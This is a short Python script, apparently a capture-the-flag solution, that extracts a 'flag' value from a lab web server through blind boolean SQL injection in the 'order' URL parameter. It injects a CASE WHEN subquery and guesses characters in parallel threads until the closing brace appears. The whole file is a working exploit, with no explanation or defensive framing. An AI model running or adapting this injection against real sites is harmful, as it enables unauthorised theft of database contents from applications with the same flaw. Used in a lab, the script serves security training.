import requests as req
import string
import concurrent.futures

url  = 'http://10.10.114.253/?order='
yes = req.get(url+"title").text

def check(counter,c):
    query = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{counter}) from flag)="{flag+c}" then title else date end)'
    res = req.get(url+query).text
    if(res==yes):
        return c

with concurrent.futures.ThreadPoolExecutor() as executor:
    flag=""
    counter = 1
    chars = string.ascii_letters + string.digits + "{" + "}"
    while(1):
        results = [executor.submit(check, counter, c) for c in chars]

        for future in concurrent.futures.as_completed(results):
            result = future.result()
            if(result):
                counter+=1
                flag+=result
                print("[+] Current Flag is",flag)
                if(flag[-1:]=="}"):
                    exit()
